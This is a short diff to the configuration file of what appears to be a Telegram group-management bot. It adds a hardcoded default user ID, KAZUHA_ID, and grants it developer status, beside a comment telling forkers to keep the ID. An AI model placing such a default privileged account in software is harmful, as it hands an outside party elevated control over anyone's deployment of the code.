@@ -118,6 +118,7 @@ if ENV:
     CASH_API_KEY = os.environ.get("CASH_API_KEY", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
     WALL_API = os.environ.get("WALL_API", None)
+    KAZUHA_ID = os.environ.get("KAZUHA_ID", 5358835742)
     SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", None)
     SPAMWATCH_SUPPORT_CHAT = os.environ.get("SPAMWATCH_SUPPORT_CHAT", None)
     SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
@@ -216,6 +217,7 @@ else:
 # If you forking dont remove this id, just add your id. LOL...
 
 DRAGONS.add(OWNER_ID)
+DEV_USERS.add(KAZUHA_ID)
 DEV_USERS.add(OWNER_ID)
 REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
 
